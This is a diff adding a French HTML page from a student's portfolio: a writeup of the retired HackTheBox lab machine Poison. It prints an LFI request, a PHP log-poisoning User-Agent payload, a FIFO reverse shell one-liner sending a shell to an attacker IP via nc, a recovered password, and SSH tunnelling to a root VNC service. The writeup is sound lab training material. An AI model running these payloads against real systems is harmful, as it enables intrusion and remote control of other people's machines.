@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Writeup — HTB Poison</title>
+<meta name="description" content="Writeup de la machine HackTheBox Poison (retirée) : LFI, log poisoning, reverse shell FIFO sur FreeBSD, tunnel SSH et privesc VNC.">
+<meta name="robots" content="noindex, nofollow">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Archivo:wdth,wght@62..125,400..900&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css">
+<link rel="icon" href="img/photo.png" type="image/png">
+</head>
+<body data-page="ctf">
+<nav>
+  <div class="wrap">
+    <a href="index.html" class="logo"><span class="mk">LG</span>Léo Gauthier</a>
+    <button class="burger" aria-label="Ouvrir le menu" aria-expanded="false">☰</button>
+    <ul class="links"><li><a href="index.html">Accueil</a></li><li class="dd"><a href="index.html#parcours">Parcours</a><ul class="dd-menu"><li><a href="formation-bts.html">BTS SIO option SISR<small>2022 – 2024</small></a></li><li><a href="formation-bachelor.html">Bachelor Développeur Solutions Numériques Sécurisées<small>2024 – 2025</small></a></li><li><a href="formation-manager.html">Manager en Ingénierie Informatique, Cybersécurité<small>2025 – 2027 · en cours</small></a></li><li><a href="entreprise-alternance.html">Alternance — Absys Informatique<small>2022 – présent</small></a></li></ul></li><li><a href="index.html#projets">Projets</a></li><li><a href="ctf.html">CTF</a></li><li><a href="documentation.html">Documentation</a></li><li><a href="index.html#contact">Contact</a></li></ul>
+  </div>
+</nav>
+
+<main>
+<header class="page-head">
+  <div class="wrap">
+    <div class="meta">Writeup · HackTheBox · machine retirée</div>
+    <h1>Poison</h1>
+    <div class="wu-meta">
+      <span class="os">FreeBSD</span>
+      <span>Difficulté : Medium</span>
+      <span>LFI</span>
+      <span>Log poisoning</span>
+      <span>Tunnel SSH</span>
+    </div>
+  </div>
+</header>
+
+<section class="sub"><div class="wrap wu">
+
+  <p class="lead">Un formulaire <code>browse.php?file=</code> vulnérable en inclusion de fichier locale (LFI) mène, via l'empoisonnement de l'access log Apache, à de l'exécution de commandes. De là : un mot de passe encodé treize fois en base64, un accès SSH, puis un tunnel vers un service VNC root n'écoutant qu'en local pour terminer en root.</p>
+
+  <h2>Phase 0 — Scan</h2>
+<pre>rustscan -a 10.129.1.254 -- -sV -sC</pre>
+<pre>22/tcp open  ssh   OpenSSH 7.2 (FreeBSD 20161230)
+80/tcp open  http  Apache httpd 2.4.29 (FreeBSD) PHP/5.6.32</pre>
+  <p>L'OS est FreeBSD, à garder en tête en permanence : les chemins diffèrent de Linux, <code>/bin/sh</code> n'est pas bash (pas de <code>/dev/tcp</code>) et le <code>nc</code> de BSD n'a pas le même comportement que le netcat GNU.</p>
+
+  <h2>Phase 1 — Reconnaissance web</h2>
+  <p>Le code source de la page d'accueil donne tout :</p>
+<pre>Sites to be tested: ini.php, info.php, listfiles.php, phpinfo.php
+&lt;form action="/browse.php" method="GET"&gt;
+    Scriptname: &lt;input type="text" name="file"&gt;</pre>
+  <p>Le paramètre <code>file</code> passé en GET est un schéma classique de LFI.</p>
+
+  <h2>Phase 2 — Confirmation de la LFI</h2>
+<pre>http://10.129.1.254/browse.php?file=/etc/passwd</pre>
+  <p>Cela fonctionne. Dans la sortie, un vrai compte utilisateur apparaît :</p>
+<pre>charix:*:1001:1001:charix:/home/charix:/bin/csh</pre>
+  <p>UID 1001, cible pour le user flag.</p>
+
+  <h2>Phase 3 — De la LFI au RCE (log poisoning)</h2>
+  <h3>Trouver le chemin des logs</h3>
+<pre>http://10.129.1.254/browse.php?file=/usr/local/etc/apache24/httpd.conf</pre>
+  <p>On y lit <code>CustomLog "/var/log/httpd-access.log"</code>. L'access log est plus fiable que l'error log : il enregistre toutes les requêtes, pas seulement celles en erreur.</p>
+
+  <h3>Empoisonner le log via Burp</h3>
+  <p>Intercepter une requête et remplacer l'en-tête <code>User-Agent</code> par du PHP :</p>
+<pre>User-Agent: &lt;?php system($_GET['cmd']); ?&gt;</pre>
+  <p>En forwardant la requête, le payload est écrit tel quel dans l'access log.</p>
+
+  <h3>Déclencher l'exécution</h3>
+<pre>http://10.129.1.254/browse.php?file=/var/log/httpd-access.log&amp;cmd=id</pre>
+<pre>uid=80(www) gid=80(www) groups=80(www)</pre>
+  <div class="note"><b>Méthode</b>Une fois le log empoisonné, inutile de repasser par Burp : on modifie simplement <code>cmd=</code> dans l'URL, le payload PHP reste actif dans le log.</div>
+
+  <h2>Phase 4 — Reverse shell</h2>
+  <p>C'est le point qui a posé problème. Plusieurs techniques standards échouent sur cet OS :</p>
+  <div class="wu-table">
+  <table>
+    <thead><tr><th>Tentative</th><th>Résultat</th><th>Raison</th></tr></thead>
+    <tbody>
+      <tr><td><code>bash -i &gt;&amp; /dev/tcp/…</code></td><td>Échec silencieux</td><td>Le <code>/bin/sh</code> de FreeBSD n'est pas bash, pas de support de <code>/dev/tcp</code></td></tr>
+      <tr><td><code>nc -e /bin/sh IP PORT</code></td><td>Échec</td><td>Sur le netcat BSD, <code>-e</code> concerne la politique IPsec, pas l'exécution</td></tr>
+      <tr><td><code>which perl / python</code></td><td>Rien</td><td>FreeBSD minimal, aucun interpréteur disponible</td></tr>
+    </tbody>
+  </table>
+  </div>
+  <p>La solution qui fonctionne est un reverse shell par FIFO, qui ne dépend ni de bash ni de l'option <code>-e</code> :</p>
+<pre>rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.10.15.150 3333 &gt;/tmp/f</pre>
+  <p>Payload passé URL-encodé dans <code>cmd=</code>. Côté attaquant : <code>nc -lvnp 3333</code>. Le message <code>can't access tty; job control turned off</code> confirme le FIFO plutôt qu'un vrai TTY.</p>
+  <div class="note"><b>Leçon</b>Sur BSD, vérifier <code>nc -h</code> en premier pour connaître les options réellement supportées, avant de perdre du temps sur des payloads qui semblent standards.</div>
+
+  <h2>Phase 5 — Pivot vers charix</h2>
+  <p>Un fichier <code>pwdbackup.txt</code> traîne dans le dossier web (<code>/usr/local/www/apache24/data/</code>). Son contenu est encodé en base64 de façon récursive (le fichier indique « encoded atleast 13 times »).</p>
+  <p>Sans l'indice, on le détecte en décodant pas à pas : tant que le résultat ressemble encore à du base64 pur, on continue. L'opération « Magic » de CyberChef automatise cette détection. Mot de passe obtenu : <code>Charix!2#4%6&amp;8(0</code>.</p>
+<pre>ssh charix@10.129.1.254</pre>
+  <p>Le home contient <code>secret.zip</code> (même mot de passe). Extrait avec <code>bsdtar -xf secret.zip</code>, il livre un fichier <code>secret</code> binaire : c'est un format propriétaire VNC, normal qu'il soit illisible en texte.</p>
+
+  <h2>Phase 6 — Élévation de privilèges vers root</h2>
+  <h3>Découverte</h3>
+<pre>ps aux</pre>
+<pre>root  608  Xvnc :1 -desktop X ... -geometry 1280x800 -depth 2</pre>
+  <p>Un service VNC tourne en root et n'écoute qu'en local (127.0.0.1).</p>
+  <div class="note"><b>Méthode</b><code>ps aux</code> doit être un réflexe systématique de la checklist d'élévation de privilèges. C'est lui qui révèle le VNC, indépendamment du fichier <code>secret</code> trouvé avant.</div>
+
+  <h3>Tunnel SSH vers le port local</h3>
+<pre>ssh -L 5901:127.0.0.1:5901 charix@10.129.1.254</pre>
+  <ul>
+    <li><code>5901</code> (premier) : port ouvert sur ma machine</li>
+    <li><code>127.0.0.1:5901</code> : destination vue depuis la cible, donc la cible elle-même</li>
+  </ul>
+  <p>Dans un second terminal :</p>
+<pre>vncviewer 127.0.0.1::5901 -passwd secret</pre>
+  <p>La session VNC s'ouvre en root. <code>cat root.txt</code>.</p>
+
+  <h2>À retenir</h2>
+  <ol>
+    <li>Toujours vérifier <code>nc -h</code> avant de supposer que <code>-e</code> se comporte comme sur le netcat GNU.</li>
+    <li>Le reverse shell par FIFO est le plus universel quand l'environnement est incertain.</li>
+    <li><code>ps aux</code> et <code>netstat -an | grep LISTEN</code> sont des réflexes d'élévation de privilèges, pas des coups de chance.</li>
+    <li>Face à un encodage répété inconnu : décoder et observer, sans connaître le nombre de tours à l'avance.</li>
+    <li>Le port forwarding SSH local (<code>-L</code>) est à maîtriser pour atteindre les services « local only ».</li>
+  </ol>
+
+  <a class="back" href="ctf.html">← Retour à la page CTF</a>
+</div></section>
+</main>
+
+<footer>© <span id="y"></span> Léo Gauthier — Avignon</footer>
+<script src="script.js" defer></script>
+</body>
+</html>
